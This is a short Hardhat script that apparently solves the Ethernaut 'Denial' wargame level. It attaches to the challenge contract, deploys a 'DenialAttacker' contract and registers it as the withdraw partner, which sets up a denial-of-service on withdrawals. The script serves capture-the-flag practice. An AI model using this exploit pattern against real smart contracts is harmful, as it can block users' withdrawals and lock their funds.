import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0xAD136E23165a1eD29479F5cccC08d816C15529B7";
const CONTRACT_NAME = "Denial";
const ATTACKER_NAME = "DenialAttacker";

async function main() {
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerFactory.deploy(contract.address);
  await attackerContract.deployed();

  const tx = await contract.setWithdrawPartner(attackerContract.address);
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
